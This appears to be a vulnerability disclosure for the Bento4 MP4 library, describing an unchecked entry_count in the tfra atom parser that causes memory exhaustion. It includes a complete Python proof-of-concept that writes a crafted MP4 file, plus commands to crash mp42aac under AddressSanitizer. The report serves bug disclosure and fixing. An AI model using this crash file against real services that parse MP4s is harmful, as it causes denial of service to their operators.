## Bug0: AP4_TfraAtom unbounded entry_count causes memory exhaustion

In `AP4_TfraAtom::AP4_TfraAtom()` in `Ap4TfraAtom.cpp` at lines 86–88, the `entry_count` field is read from the stream and passed directly to `m_Entries.SetItemCount(entry_count)` without any validation against the remaining atom payload size, allowing an attacker-controlled value to trigger a massive heap allocation that exhausts process memory and crashes the process.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def box(fourcc: bytes, payload: bytes) -> bytes:
    return struct.pack(">I", 8 + len(payload)) + fourcc + payload

def full_box(fourcc: bytes, version: int, flags: int, payload: bytes) -> bytes:
    hdr = struct.pack(">I", 12 + len(payload)) + fourcc
    hdr += bytes([version]) + struct.pack(">I", flags & 0xFFFFFF)[1:]
    return hdr + payload

ftyp = box(b"ftyp", b"isom" + struct.pack(">I", 0) + b"isom")

_identity_matrix = (
    struct.pack(">I", 0x00010000)
    + struct.pack(">I", 0)
    + struct.pack(">I", 0)
    + struct.pack(">I", 0)
    + struct.pack(">I", 0x00010000)
    + struct.pack(">I", 0)
    + struct.pack(">I", 0)
    + struct.pack(">I", 0)
    + struct.pack(">I", 0x40000000)
)

mvhd_payload = (
    struct.pack(">I", 0)
    + struct.pack(">I", 0)
    + struct.pack(">I", 1000)
    + struct.pack(">I", 0)
    + struct.pack(">I", 0x00010000)
    + struct.pack(">H", 0x0100)
    + b"\x00" * 10
    + _identity_matrix
    + b"\x00" * 24
    + struct.pack(">I", 2)
)

mvhd = full_box(b"mvhd", 0, 0, mvhd_payload)
moov = box(b"moov", mvhd)
mdat = box(b"mdat", b"")

EVIL_COUNT = 0x3FFFFFFF

tfra_payload = (
    struct.pack(">I", 1)
    + struct.pack(">I", 0)
    + struct.pack(">I", EVIL_COUNT)
)
tfra = full_box(b"tfra", 0, 0, tfra_payload)

mfra_payload_len = len(tfra) + 16
mfra_total = 8 + mfra_payload_len
mfro = (
    struct.pack(">I", 16)
    + b"mfro"
    + b"\x00\x00\x00\x00"
    + struct.pack(">I", mfra_total)
)

mfra = box(b"mfra", tfra + mfro)
mp4 = ftyp + moov + mdat + mfra

with open("poc_input.mp4", "wb") as f:
    f.write(mp4)

print(f"[+] Written {len(mp4)} bytes to poc_input.mp4")
print(f"    tfra entry_count = 0x{EVIL_COUNT:08X} ({EVIL_COUNT:,})")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log:hard_rss_limit_mb=8192" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** AddressSanitizer: hard rss limit exhausted (8192Mb vs 8198Mb)
Trigger: tfra atom with entry_count=0x3FFFFFFF causes AP4_Array<Entry>::SetItemCount(0x3FFFFFFF) which calls EnsureCapacity requesting approximately 28 GB from ::operator new, exhausting memory and aborting the process.

### Impact

An attacker who supplies a crafted MP4 file containing a tfra atom with an oversized `entry_count` field can force mp42aac (and any other Bento4 tool that parses mfra boxes) to attempt a multi-gigabyte heap allocation, resulting in process termination through OOM or an uncaught `std::bad_alloc` exception. The attack surface is any invocation of mp42aac or related Bento4 utilities on an untrusted MP4 file, and the malicious file itself can be fewer than 200 bytes in size. The impact is denial of service with no memory-write primitive exposed, so code execution is not achievable through this path alone.
